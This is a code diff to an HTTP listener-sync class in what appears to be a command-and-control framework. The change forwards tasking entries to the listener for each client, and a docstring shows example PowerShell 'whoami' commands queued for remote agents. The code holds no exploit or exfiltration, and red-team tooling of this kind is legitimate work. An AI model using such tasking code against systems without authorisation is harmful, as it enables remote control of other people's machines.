@@ -34,19 +34,46 @@ class ListenerHttpSync:
         # problems; ineffecient. Lots of requests. No "universal" packet being sent to client. 
         # lets try it.
 
-        # rename json_entry to something better
-        for json_entry in response:
-            self.data.Listeners.HTTP.add_synced_data(data=json_entry)
-            
-            # maybe just have listener objects tbh?
-            
-            # extract which listener based on current clietns from listener
-            #self.data.Listeners.HTTP.get_listener_from_client_uuid(client_uuid)    # returns listener UUID
+        """
+            Response Example:
+            [
+                {'client_nicnkname': 'standin_nickname', 'action': 'powershell', 'executable': 'ps.exe', 'command': 'whoami', 'aid': 'standin_aid'}, 
+                {'client_nicnkname': 'standin_nickname', 'action': 'powershell', 'executable': 'ps.exe', 'command': 'whoami', 'aid': 'standin_aid'}
+            ]
 
-            #self.data.Listeners.HTTP.get_listener_by_nickname(listener_uuid)       # change to UUID
+        """
 
-            # send request to said listener. 
-            #listener_object.forward_request(json_entry)
+        for dict_entry in response:
+            self.data.Listeners.HTTP.add_synced_data(data=dict_entry)
+
+            #print(dict_entry)
+            #print(type(dict_entry))
+
+            # Extract the client nickname (eventually this should be changed to LID/UUID)
+            client_nickname = dict_entry.get("client_nickname")
+            if client_nickname is None:
+                self.logger.warning("Client nickname is missing in the response entry.")
+                continue
+
+            # Extract the listener object based on the current clients from the listener
+            listener_object = self.data.Listeners.HTTP.get_client_listener(cid=client_nickname)
+            if listener_object is None:
+                self.logger.warning(f"Listener LID for CID {client_nickname} not found.")
+                continue
+
+            # Retrieve the listener object using the listener LID
+            #listener_object = self.data.Listeners.HTTP.get_listener_class_object_by_lid(listener_lid)
+            #if listener_object is None:
+            #    self.logger.warning(f"Listener object for LID {listener_lid} not found.")
+            #    continue
+
+            # Forward the request to the listener
+            try:
+                listener_object.forward_request(dict_entry)
+                self.logger.debug(f"Request forwarded to listener {listener_object.lid} for client {client_nickname}.")
+            except Exception as e:
+                self.logger.error(f"Failed to forward request to listener {listener_object.lid} for client {client_nickname}: {e}")
+
 
 
 
